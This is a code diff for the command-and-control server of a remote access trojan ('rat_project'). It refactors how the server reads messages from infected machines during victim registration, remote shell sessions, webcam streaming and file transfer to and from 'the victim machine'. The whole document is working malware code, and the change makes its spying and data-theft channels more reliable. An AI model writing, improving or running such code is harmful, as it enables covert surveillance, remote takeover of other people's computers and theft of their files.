@@ -14,7 +14,7 @@ from datetime import datetime
 from pathlib import Path
 from typing import Any
 
-from rat_project.common.protocol import decode_message, encode_message
+from rat_project.common.protocol import decode_message, encode_message, recv_message
 from rat_project.common.tls import create_server_ssl_context
 from rat_project.utils.logger_config import setup_logger
 
@@ -136,12 +136,7 @@ def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
         logger.info("Incoming connection from %s:%s", addr[0], addr[1])
 
         # First message: registration required
-        data = conn.recv(4096)
-        if not data:
-            logger.warning("Empty data received from %s:%s", addr[0], addr[1])
-            return
-
-        payload = decode_message(data.decode("utf-8").strip())
+        payload = recv_message(conn)
 
         if payload.get("type") != "register":
             logger.warning("Invalid first message from %s:%s: %s", addr[0], addr[1], payload)
@@ -212,16 +207,7 @@ def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None 
         message.update(extra)
 
     conn.sendall(encode_message(message))
-    
-    # Read until newline delimiter
-    buffer = b""
-    while b"\n" not in buffer:
-        chunk = conn.recv(65536)
-        if not chunk:
-            break
-        buffer += chunk
-    
-    return decode_message(buffer.decode("utf-8").strip())
+    return recv_message(conn)
 
 
 def interact_with_session(session_id: int) -> None:
@@ -375,8 +361,7 @@ def _shell_session(conn: socket.socket, session_id: int) -> None:
                 continue
 
             conn.sendall(encode_message({"type": "shell_input", "input": cmd}))
-            data = conn.recv(65536)
-            response = decode_message(data.decode("utf-8").strip())
+            response = recv_message(conn)
             print(response.get("output", ""), end="")
 
         except KeyboardInterrupt:
@@ -403,11 +388,7 @@ def _webcam_stream_session(conn: socket.socket, session_id: int) -> None:
 
     try:
         while True:
-            data = conn.recv(10 * 1024 * 1024)  # 10 MB max per frame
-            if not data:
-                break
-
-            response = decode_message(data.decode("utf-8").strip())
+            response = recv_message(conn)
 
             if response.get("type") == "stream_error":
                 print(f"[!] Stream error: {response.get('error')}")
@@ -448,8 +429,7 @@ def _download_file(conn: socket.socket, remote_path: str) -> None:
         remote_path: Path of the file on the victim machine.
     """
     conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
-    data = conn.recv(10 * 1024 * 1024)  # 10 MB max
-    response = decode_message(data.decode("utf-8").strip())
+    response = recv_message(conn)
 
     if response.get("error"):
         print(f"[!] {response['error']}")
@@ -490,8 +470,7 @@ def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
         )
     )
 
-    data = conn.recv(4096)
-    response = decode_message(data.decode("utf-8").strip())
+    response = recv_message(conn)
     print(response.get("output", "[?] Unexpected response"))
     logger.info("File uploaded to session %s: %s", session_id, local_path)
 
